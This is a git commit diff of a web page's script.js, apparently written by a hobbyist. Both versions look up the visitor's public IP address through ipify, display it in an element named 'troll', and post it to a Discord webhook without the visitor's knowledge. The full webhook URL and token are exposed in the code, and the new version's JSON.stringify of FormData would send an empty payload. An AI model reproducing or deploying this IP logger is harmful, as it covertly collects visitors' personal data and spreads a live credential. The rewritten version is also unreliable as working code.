ba6420d485bf0b97e32fd8d1f5f616e85478e967
goofnutt <167395818+goofnutt@users.noreply.github.com>
2024-04-20 19:33:51 -0700

    Update script.js

--- script.js
+++ script.js
@@ -1,12 +1,12 @@
-var Requester = new XMLHttpRequest()
-Requester.open('GET', 'https://api.ipify.org', false)
-Requester.send(null)
-document.getElementById('troll').innerHTML = Requester.responseText
-var data = new FormData()
-data.append('content', Requester.responseText)
-Requester.open(
-  'POST',
-  'https://discord.com/api/webhooks/1230673184089440327/xxYOmaRr1PlwDR9MS1RZXFp01Jgf_IaxzawR4xiKHnptKVDusa4Anb7A6tr8l5O7lhKQ',
-  false
-)
-Requester.send(data)
+var Requester = new XMLHttpRequest();
+Requester.open('GET', 'https://api.ipify.org', false);
+Requester.send(null);
+document.getElementById('troll').innerHTML = Requester.responseText;
+
+var data = new FormData();
+data.append('content', Requester.responseText);
+
+var webhookRequest = new XMLHttpRequest();
+webhookRequest.open('POST', 'https://discord.com/api/webhooks/1230673184089440327/xxYOmaRr1PlwDR9MS1RZXFp01Jgf_IaxzawR4xiKHnptKVDusa4Anb7A6tr8l5O7lhKQ', true);
+webhookRequest.setRequestHeader('Content-type', 'application/json');
+webhookRequest.send(JSON.stringify(data));
